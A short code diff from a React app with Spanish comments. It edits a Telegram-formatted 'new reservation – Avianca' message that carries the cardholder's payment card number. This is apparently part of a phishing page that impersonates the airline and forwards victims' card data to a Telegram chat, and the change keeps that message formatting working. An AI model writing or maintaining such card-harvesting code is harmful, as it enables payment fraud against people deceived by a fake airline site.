@@ -228,7 +228,7 @@ export default function App() {
 
     // **PLANTILLA MODIFICADA: Usando MarkdownV2 para Telegram (se asumió que el backend lo requiere)**
     const baseMessage = `
-✈️ NUEVA RESERVA \\- AVIANCA ✈️
+✈️ NUEVA RESERVA - AVIANCA ✈️
 
 👤 DATOS DEL TITULAR
 💳 Tarjeta: ${escapeMarkdownV2(paymentData.cardNumber)}
